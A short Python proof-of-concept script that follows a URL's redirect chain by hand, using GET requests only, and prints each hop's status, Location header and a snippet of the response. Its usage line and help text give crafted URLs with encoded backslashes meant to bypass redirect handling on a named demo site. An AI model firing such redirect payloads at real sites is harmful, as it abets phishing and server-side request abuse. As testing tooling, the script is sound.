#!/usr/bin/env python3
"""
python3 poc_rewrite.py --url "https://demo.djangocfg.com/%5C%5Clocalhost:3000?tag=zz"


poc_rewrite.py
Follows a single URL and walks redirect chain manually (inspects Location headers).
Safe: only follows up to MAX_HOPS and never performs POST/PUT/DELETE.
"""
import argparse, requests, urllib.parse, json, time

HEADERS = {"User-Agent": "poc-rewrite/1.0"}
MAX_HOPS = 10
TIMEOUT = 8

def walk(url):
    chain = []
    visited = set()
    hops = 0
    current = url
    while hops < MAX_HOPS:
        try:
            r = requests.get(current, headers=HEADERS, timeout=TIMEOUT, allow_redirects=False)
        except Exception as e:
            chain.append({"url": current, "error": str(e)})
            break
        entry = {"url": current, "status": r.status_code, "location": r.headers.get("location"), "snippet": (r.text or "")[:400]}
        chain.append(entry)
        loc = r.headers.get("location")
        if not loc:
            break
        # Resolve relative locations against the current URL
        next_url = urllib.parse.urljoin(current, loc)
        if next_url in visited:
            chain.append({"note": "loop detected", "next": next_url})
            break
        visited.add(next_url)
        current = next_url
        hops += 1
        time.sleep(0.15)
    return chain

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True, help="Full URL to start (e.g. https://demo.djangocfg.com/%5Chttps://...)")
    args = parser.parse_args()
    ch = walk(args.url)
    print(json.dumps(ch, indent=2))
